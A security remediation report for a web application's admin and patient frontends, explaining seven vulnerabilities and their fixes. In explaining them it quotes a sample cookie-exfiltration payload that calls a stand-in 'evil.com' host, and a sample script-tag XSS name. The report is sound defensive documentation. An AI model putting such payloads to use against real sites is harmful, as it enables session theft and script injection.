# Frontend Security Remediation Report

This document details the 7 security vulnerabilities identified by the senior developer, explaining the root cause of each issue and the technical solution that was implemented to resolve it.

---

## 1. Browser Remote Code Execution (RCE) via `new Function()`
**Severity:** Critical
**Locations:** 
- `admin-ui/src/components/preview/CalculatedScoreComponent.jsx`
- `patient-ui/src/components/CalculatedScoreComponent.jsx`

### The Issue
The application allows administrators to define custom mathematical formulas for calculating scores. The previous implementation executed these formulas by dynamically creating a JavaScript function using `new Function(formula)`. This is highly dangerous because `new Function` has full access to the global scope (unlike `eval()` which has local scope limitations). An attacker who could inject a malicious formula into the database (e.g., `fetch('//evil.com/?data=' + document.cookie)`) would achieve Remote Code Execution in the browser of any user who viewed that form.

### The Fix
We replaced the `new Function()` approach with the `expr-eval` library. `expr-eval` is a sandboxed mathematical expression parser. It safely evaluates math operations (+, -, *, /) and logic without exposing any browser globals (`window`, `fetch`, `document`, etc.). Even if a malicious payload is stored in the database, the parser will simply throw an error rather than executing the code.

---

## 2. Stored Cross-Site Scripting (XSS) in QR Print Popup
**Severity:** High
**Location:** `admin-ui/src/pages/ProjectDashboard.jsx`

### The Issue
When an administrator clicked "Print All QR Codes", the application opened a new window and used `document.write()` along with template literals to inject the HTML content. Crucially, it injected the `project.name` directly into the HTML string without escaping it. If an attacker created a project with a malicious name like `<script>alert('XSS')</script>`, that script would execute whenever an admin tried to print the QR codes, leading to a Stored XSS vulnerability.

### The Fix
We eliminated the use of `document.write()` and template strings for HTML generation. Instead, the popup now uses safe DOM APIs (`document.createElement()`, `element.textContent`, and `element.cloneNode()`). By assigning the project name to `textContent`, the browser treats it purely as text, neutralizing any HTML tags or script injection attempts.

---

## 3. Server-Side Request Forgery (SSRF) / Untrusted Sync Endpoint
**Severity:** High
**Location:** `patient-ui/src/utils/syncQueue.js`

### The Issue
The offline synchronization queue was reading the `targetUrl` directly from the stored submission object and making a `POST` request to that URL. Since the submission object originates from the client-side (and is stored in `localStorage`), a malicious user could manipulate their local storage to change `targetUrl` to an internal network address or a malicious server. When the app attempted to sync, it would send the data to the attacker-controlled destination.

### The Fix
We completely removed reliance on `submission.targetUrl`. The application now statically derives the endpoint URL in the code (`${API_URL}/patient/forms/${submission.formId}/submissions`). Furthermore, we added strict validation to ensure `submission.formId` is a safe integer before constructing the URL, causing the sync to fail-safe if the ID is manipulated.

---

## 4. Missing Nginx Security Headers
**Severity:** High
**Locations:** 
- `admin-ui/nginx.conf`
- `patient-ui/nginx.conf`

### The Issue
The Nginx configurations serving the built React applications lacked standard HTTP security headers. This left the applications vulnerable to clickjacking (embedding the app in a malicious iframe), MIME-type sniffing, and lacked a Content Security Policy (CSP) to restrict where scripts, images, and API requests could originate from.

### The Fix
We injected a comprehensive suite of security headers into both Nginx configurations:
- **`X-Frame-Options: DENY`**: Prevents clickjacking.
- **`X-Content-Type-Options: nosniff`**: Prevents MIME confusion attacks.
- **`Referrer-Policy: strict-origin-when-cross-origin`**: Protects routing data.
- **`Permissions-Policy`**: Restricts hardware API access (camera/geolocation) to the application itself.
- **`Content-Security-Policy` (CSP)**: Added strict policies locking down execution to `'self'`, while explicitly allowing required third-party resources (like OpenStreetMap tiles for Leaflet).

---

## 5. CSV Export via Top-Level Navigation
**Severity:** Medium
**Location:** `admin-ui/src/pages/Responses.jsx`

### The Issue
To export form responses to CSV, the application used `window.location.href = URL`. While this works, top-level navigation cannot carry HTTP headers (such as an `Authorization: Bearer <token>` header). This meant that the export endpoint on the backend could not be properly secured with JWT authentication, as the browser wouldn't send the token when navigating directly.

### The Fix
We rewrote the export handler to use the `fetch()` API. This allows the application to attach standard `Authorization` headers to the request. Once the backend responds with the CSV data, the frontend converts it into a `Blob`, generates a temporary object URL, and triggers an invisible download link using DOM manipulation.

---

## 6. Unvalidated LocalStorage Context (Prototype Pollution / Tampering)
**Severity:** Medium
**Locations:** 
- `patient-ui/src/utils/context.js` (New File)
- `patient-ui/src/components/HomePage.jsx`
- `patient-ui/src/App.jsx`
- `patient-ui/src/components/NavBar.jsx`

### The Issue
The application stored its active session context (Project ID, Site ID, Center ID) in `localStorage` and read it directly via `JSON.parse()`. A user could tamper with this object in their browser dev tools to inject arbitrary keys or malformed data, potentially causing application crashes or exploiting downstream logic that blindly trusted the context object.

### The Fix
We created a centralized `context.js` utility that leverages the `yup` validation library. Before writing to or reading from `localStorage`, the context object is strictly validated against a schema that only allows alphanumeric strings (max 32-64 characters). Any unknown keys are automatically stripped. If the stored data is malformed, the application safely clears the storage and resets to a clean state.

---

## 7. Verbose Error Leakage
**Severity:** Medium
**Location:** `admin-ui/src/pages/ProjectList.jsx`

### The Issue
When an API request failed (e.g., creating a project), the application was logging the full API URL and raw error details to the browser console. Additionally, it was presenting the raw error message (`err.message` or `err.detail`) directly in a user-facing `alert()`. Exposing internal API structures and raw error traces to end-users provides valuable reconnaissance data to attackers.

### The Fix
We updated the error handling block to only log the detailed error stack trace to the console if the application is running in Development mode (`import.meta.env.DEV`). For the end-user facing `alert()`, we replaced the dynamic error injection with a static, generic message: *"Could not connect to the backend. Please check your network and try again."*
